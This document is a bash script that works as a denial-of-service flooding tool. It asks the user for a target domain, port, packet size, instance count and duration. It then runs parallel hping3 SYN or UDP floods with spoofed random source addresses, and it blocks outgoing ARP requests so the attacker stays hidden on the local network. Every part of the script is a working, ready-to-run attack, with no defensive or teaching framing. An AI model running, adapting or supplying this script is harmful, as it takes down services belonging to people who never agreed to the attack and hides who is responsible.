#!/bin/bash
#!/bin/bash
clear
cat warning.txt
echo ""
read -p "Do you accept the terms in the README? [Y/N]: " confirm
confirm=$(echo "$confirm" | tr '[:upper:]' '[:lower:]')

if [[ "$confirm" != "y" ]]; then
    echo "Aborted."
    exit 1
fi

read -p "Domain to attack: " domain
read -p "Request size: " size
read -p "Win size: " win
read -p "Port to attack: " port
read -p "Number of parallel instances: " instances
read -p "Duration of attack (in seconds): " duration

echo "TCP attack"
echo "UDP attack"
read -p "<T/U> " tu
tu=$(echo "$tu" | tr '[:lower:]' '[:upper:]')

# Block ARP to stay hidden on LAN
sudo ebtables -A OUTPUT -p arp --arp-op Request -j DROP

# Build the base hping3 command
if [ "$tu" = "T" ]; then
    attack_cmd="sudo hping3 -d $size --syn --win $win -p $port --flood --rand-source $domain"
elif [ "$tu" = "U" ]; then
    attack_cmd="sudo hping3 -d $size --udp --win $win -p $port --flood --rand-source $domain"
else
    echo "Invalid input: must be T or U"
    sudo ebtables -D OUTPUT -p arp --arp-op Request -j DROP
    exit 1
fi

# Launch parallel hping3 flood inside a timed subshell
(
    yes "$attack_cmd" | head -n "$instances" | parallel -j"$instances" --no-notice &
    flood_pid=$!
    sleep "$duration"
    echo "Time's up — stopping attack..."
    sudo pkill -f hping3
    sudo pkill -f "bash -c"
    wait $flood_pid 2>/dev/null
) &

wait

# Unblock ARP again
sudo ebtables -D OUTPUT -p arp --arp-op Request -j DROP

echo -e "\n\033[1;32mAttack completed. All processes stopped after $duration seconds.\033[0m"
read -p "Press Enter to exit." finish
